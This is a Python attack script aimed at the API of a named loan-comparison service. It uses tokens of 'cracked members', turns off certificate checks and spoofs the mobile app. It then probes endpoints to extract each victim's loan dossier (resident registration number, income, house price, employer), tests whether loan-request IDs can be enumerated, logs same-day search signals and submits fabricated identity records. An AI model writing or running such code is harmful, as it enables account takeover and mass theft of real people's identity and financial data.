#!/usr/bin/env python3
"""Flow digger: find each cracked member's bigyoLoanFlwSeq so
getBigyoLoanFlw hands back the full dossier (rrNo, annualIncom, housePrice…).

Spec intel:
  POST /bigyo/api/bigyo/getBigyoLoanFlw?flowType=X   body BigyoLoanFlwParamDTO
       -> DataResponse<BigyoLoanFlwResultDTO>: rrNo, mobile, name, requestDt,
          annualIncom, housePrice, companyName, loanAmount, …
  POST /bigyo/api/bigyo/bigyoLoanFlw                  (이어하기 추가)
       body BigyoLoanFlwParamDTO -> generic object (likely the new seq)

Per cracked member:
  1. no-seq probes: flowType x {bare, memberSeq injected} — maybe the server
     resolves the member's latest flow from the JWT/session alone.
  2. loReqtNo values from loans_raw/<mob>.json tried AS the seq (systems often
     share one sequence space).
  3. one guarded ADD (bigyoLoanFlw) to learn the seq-allocation shape.

Outputs: flow_hits.csv (hits only), flow_dig_log.jsonl (journal),
flow_seqs.json (confirmed seqs, consumed by walkers later).
"""
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
FLOW_TYPES = ("CREDIT", "COMBINE", "MORTGAGE", "ETC", "REHAB_ONE")
PACE = 0.3
MAX_REQ_PER_MEMBER = 26
ADD_DONE = os.path.join(HERE, "flow_add_done.json")
SEQS_FILE = os.path.join(HERE, "flow_seqs.json")
HITS_CSV = os.path.join(HERE, "flow_hits.csv")
SAME_DAY_SIG = os.path.join(HERE, "same_day_signals.csv")
LOG = os.path.join(HERE, "flow_dig_log.jsonl")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def post(token, path, body=None):
    url = BASE + path
    data = json.dumps(body or {}).encode()
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, {"raw": raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:400]}
    except Exception as e:
        return 0, {"error": repr(e)[:200]}


def journal(line):
    with open(LOG, "a") as f:
        f.write(json.dumps(line, ensure_ascii=False) + "\n")


def hit_data(doc):
    if not isinstance(doc, dict):
        return None
    d = doc.get("data")
    if isinstance(d, dict) and any(v not in (None, "", [], {}) for v in d.values()):
        return d
    return None


def load_member_seq(mob):
    fp = os.path.join(HERE, "loans_raw", mob.replace("-", "_") + ".json")
    if not os.path.exists(fp):
        return None, []
    try:
        raw = json.load(open(fp))
    except Exception:
        return None, []
    mi = raw.get("myinfo") or {}
    data = mi.get("data") if isinstance(mi, dict) else None
    seq = data.get("memberSeq") if isinstance(data, dict) else None
    loans = raw.get("loans") or {}
    lst = loans.get("data") if isinstance(loans, dict) else (loans if isinstance(loans, list) else None)
    lreq = []
    if isinstance(lst, list):
        for it in lst:
            v = it.get("loReqtNo")
            if v:
                lreq.append(str(v))
    return seq, lreq


def csv_write(row):
    cols = ["ts", "mobile", "name", "kind", "flowType", "body", "data"]
    new = not os.path.exists(HITS_CSV)
    with open(HITS_CSV, "a", newline="") as f:
        import csv
        w = csv.writer(f)
        if new:
            w.writerow(cols)
        w.writerow(row)


def main():
    creds = tokstore.load()
    if not creds:
        print("FLOWDIG no cracked members")
        return
    seqs = {}
    if os.path.exists(SEQS_FILE):
        try:
            seqs = json.load(open(SEQS_FILE))
        except Exception:
            seqs = {}
    add_done = {}
    if os.path.exists(ADD_DONE):
        try:
            add_done = json.load(open(ADD_DONE))
        except Exception:
            add_done = {}

    for cr in creds:
        mob, name, tok = cr["mobile"], cr.get("name", ""), cr["token"]
        mseq, lreqs = load_member_seq(mob)
        print(f">>> FLOWDIG {mob} {name} memberSeq={mseq} loReqtNos={lreqs}", flush=True)
        reqs = 0

        def probe(kind, flow, body):
            nonlocal reqs
            if reqs >= MAX_REQ_PER_MEMBER:
                return
            reqs += 1
            st, doc = post(tok, f"/bigyo/api/bigyo/getBigyoLoanFlw?flowType={flow}", body)
            d = hit_data(doc)
            journal({"ts": time.strftime("%FT%TZ", time.gmtime()), "mobile": mob,
                     "kind": kind, "flowType": flow, "body": body,
                     "status": st, "hit": bool(d)})
            if d:
                seq_val = d.get("bigyoLoanFlwSeq")
                if seq_val:
                    seqs[mob] = str(seq_val)
                csv_write([time.strftime("%FT%TZ", time.gmtime()), mob, name,
                           kind, flow, json.dumps(body, ensure_ascii=False),
                           json.dumps(d, ensure_ascii=False)])
                print(f"HIT {kind}/{flow} seq={seq_val}", flush=True)
            time.sleep(PACE)

        # 1. no-seq resolution probes — app posts EMPTY body (bundle:
        #    getBigyoLoanFlw(flowType){adapter:null}); also try the two
        #    documented appTypes FOLLOWING/EXISTING.
        for ft in FLOW_TYPES:
            probe("noseq_empty", ft, {})
            probe("noseq_follow", ft, {"appType": "FOLLOWING"})
            probe("noseq_exist", ft, {"appType": "EXISTING"})

        # 1b. loan-list-check WITH member token: shape study of loReqtNo
        #     discrimination (anon gave flat 401; with JWT we may see
        #     valid-vs-invalid divergence => enumeration feasibility)
        ymd = time.strftime("%Y%m%d")
        lchk_cands = ["1", "100", "1000000", ymd + "00000000001",
                      "999999999999999999999"]
        if mseq:
            try:
                msi = int(mseq)
                lchk_cands += [str(msi - 1), str(msi), str(msi + 1)]
            except ValueError:
                pass
        for lr in lchk_cands:
            if reqs >= MAX_REQ_PER_MEMBER:
                break
            reqs += 1
            cst, cdoc = post(tok, "/bigyo/api/bigyo/loan-list-check?loReqtNo="
                                  + urllib.parse.quote(lr))
            cb = json.dumps(cdoc, ensure_ascii=False)[:200]
            journal({"ts": time.strftime("%FT%TZ", time.gmtime()),
                     "mobile": mob, "kind": "lchk_tok", "loReqtNo": lr,
                     "status": cst, "resp": cb})
            print(f"LCHK-TOK {mob} {lr} -> {cst} {cb[:120]}", flush=True)
            time.sleep(PACE)

        # 2. loReqtNo as seq
        for lr in lreqs[:3]:
            probe("lreq_as_seq", "CREDIT", {"bigyoLoanFlwSeq": lr, "applyType": "EXISTING", "step": "1"})

        # 3. check-dup-inquiry: per-flowType today-search flags (TdySrchYn/Dtm,
        #    LoReqtNo) — the member-side SAME-DAY indicator.
        if reqs < MAX_REQ_PER_MEMBER:
            reqs += 1
            st, doc = post(tok, "/bigyo/api/bigyo/check-dup-inquiry", {})
            journal({"ts": time.strftime("%FT%TZ", time.gmtime()), "mobile": mob,
                     "kind": "dup_inquiry", "status": st, "doc": doc})
            print(f"DUPINQ {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:200]}", flush=True)
            rows = (doc or {}).get("data") if isinstance(doc, dict) else None
            if isinstance(rows, list):
                sd_new = not os.path.exists(SAME_DAY_SIG)
                for r in rows:
                    if not isinstance(r, dict):
                        continue
                    tdy = str(r.get("TdySrchYn") or "")
                    lreq = r.get("LoReqtNo")
                    if lreq:
                        lreqs.append(str(lreq))
                    with open(SAME_DAY_SIG, "a", newline="") as f:
                        import csv
                        w = csv.writer(f)
                        if sd_new:
                            w.writerow(["ts", "mobile", "name", "flowType", "tdySrchYn",
                                        "tdySrchDtm", "loReqtNo", "sucResExistsYn",
                                        "maxLimit", "minRate"])
                            sd_new = False
                        w.writerow([time.strftime("%FT%TZ", time.gmtime()), mob, name,
                                    r.get("FlowType", ""), tdy, r.get("TdySrchDtm", ""),
                                    lreq or "", r.get("SucResExistsYn", ""),
                                    r.get("MaxLimit", ""), r.get("MinRate", "")])
                    if tdy == "Y":
                        print(f"★★★ TDY_SRCH {mob} {name} flow={r.get('FlowType')} "
                              f"dTM={r.get('TdySrchDtm')} loReqtNo={lreq}", flush=True)
            time.sleep(PACE)

        # 4. step-"-1" identity-group ADD (bundle contract: ci, memberType,
        #    step=-1, rrNo, txSeqNo, carrier) — old fmt invalidated by marker
        prev = add_done.get(mob)
        if (not prev or prev.get("fmt") != "step_-1") and reqs < MAX_REQ_PER_MEMBER:
            reqs += 1
            body = {"bigyoLoanFlwSeq": "", "ci": "PROBE_CI_0001", "memberType": "1",
                    "step": "-1", "rrNo": "7711021000001",
                    "txSeqNo": "PROBE_TX_0001", "carrier": "KT"}
            st, doc = post(tok, "/bigyo/api/bigyo/bigyoLoanFlw", body)
            add_done[mob] = {"ts": time.strftime("%FT%TZ", time.gmtime()), "fmt": "step_-1",
                             "status": st, "resp": doc if isinstance(doc, dict) else str(doc)[:300]}
            journal(add_done[mob] | {"mobile": mob, "kind": "add_step_-1"})
            print(f"ADD-1 {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:250]}", flush=True)
            if isinstance(doc, dict):
                cand = doc.get("data")
                if isinstance(cand, dict) and cand.get("bigyoLoanFlwSeq"):
                    seqs[mob] = str(cand["bigyoLoanFlwSeq"])
                elif isinstance(cand, (int, str)) and str(cand).isdigit():
                    seqs[mob] = str(cand)
            time.sleep(PACE)

    with open(SEQS_FILE, "w") as f:
        json.dump(seqs, f, indent=1)
    with open(ADD_DONE, "w") as f:
        json.dump(add_done, f, indent=1)
    print(f"FLOWDIG DONE seqs={seqs}", flush=True)


if __name__ == "__main__":
    main()
